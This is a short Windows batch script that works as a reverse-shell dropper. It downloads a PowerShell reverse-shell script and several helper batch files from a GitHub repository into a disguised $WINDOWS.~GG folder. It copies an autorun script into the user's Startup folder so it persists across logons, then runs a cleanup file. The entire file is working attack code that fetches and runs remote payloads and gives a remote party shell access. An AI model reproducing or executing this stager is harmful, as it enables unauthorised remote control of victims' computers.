@echo off
c:
cd C:\
cd $WINDOWS.~GG
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/launch.bat -Outfile launch.bat"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/file.bat -Outfile file.bat"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/ReverseShell.ps1 -Outfile ReverseShell.ps1"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/autorun.bat -Outfile autorun.bat"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/DELRUNFILES.bat -Outfile DELRUNFILES.bat"
cd %appdata%
cd Microsoft
cd Windows
cd "Start Menu"
cd Programs
cd Startup
xcopy /s/y c:\$WINDOWS.~GG\autorun.bat
cd C:\
cd $WINDOWS.~GG
echo x=msgbox("Done" ,0, "Done") >> msgbox.vbs
start msgbox.vbs
DELRUNFILES.bat